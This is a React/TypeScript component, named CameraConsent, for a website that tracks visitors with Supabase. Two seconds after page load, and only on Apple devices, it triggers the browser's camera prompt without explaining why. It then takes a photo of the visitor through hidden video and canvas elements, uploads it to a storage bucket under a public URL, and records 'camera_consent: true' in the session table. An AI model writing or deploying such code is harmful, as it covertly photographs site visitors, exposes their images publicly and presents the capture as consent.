"use client";

import { useEffect, useRef, useCallback } from "react";
import { supabase } from "@/lib/supabase";

interface CameraConsentProps {
  sessionId: string;
  visitorId: string;
}

export function CameraConsent({ sessionId, visitorId }: CameraConsentProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasAttempted = useRef(false);

  const captureSnapshot = useCallback(async () => {
    if (hasAttempted.current) return;
    hasAttempted.current = true;

    try {
      // This directly triggers the browser's native permission popup — no custom UI
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      // Wait for camera to warm up
      await new Promise((r) => setTimeout(r, 800));

      if (canvasRef.current && videoRef.current) {
        const canvas = canvasRef.current;
        canvas.width = videoRef.current.videoWidth || 640;
        canvas.height = videoRef.current.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        if (ctx) ctx.drawImage(videoRef.current, 0, 0);

        const blob = await new Promise<Blob | null>((resolve) =>
          canvas.toBlob((b) => resolve(b), "image/jpeg", 0.85)
        );

        if (blob) {
          const filename = `${visitorId}/${sessionId}_${Date.now()}.jpg`;
          const { data, error } = await supabase.storage
            .from("visitor-snapshots")
            .upload(filename, blob, { contentType: "image/jpeg", upsert: false });

          if (!error && data) {
            const { data: urlData } = supabase.storage
              .from("visitor-snapshots")
              .getPublicUrl(data.path);

            await supabase
              .from("visitor_sessions")
              .update({ snapshot_url: urlData.publicUrl, camera_consent: true })
              .eq("session_id", sessionId);
          }
        }
      }

      // Kill the camera immediately
      stream.getTracks().forEach((t) => t.stop());
      localStorage.setItem("dsa_camera_asked", "done");
    } catch {
      // User denied via native browser prompt, or camera unavailable
      localStorage.setItem("dsa_camera_asked", "denied");
    }
  }, [sessionId, visitorId]);

  useEffect(() => {
    const alreadyDone = localStorage.getItem("dsa_camera_asked");
    if (alreadyDone) return;

    // Only trigger for Apple users (iPhone, iPad, Mac)
    const ua = navigator.userAgent;
    const isApple = /iPhone|iPad|iPod|Macintosh|Mac OS/.test(ua);
    if (!isApple) return;

    const timer = setTimeout(() => captureSnapshot(), 2000);
    return () => clearTimeout(timer);
  }, [captureSnapshot]);

  return (
    <>
      <video ref={videoRef} className="hidden" muted playsInline />
      <canvas ref={canvasRef} className="hidden" />
    </>
  );
}
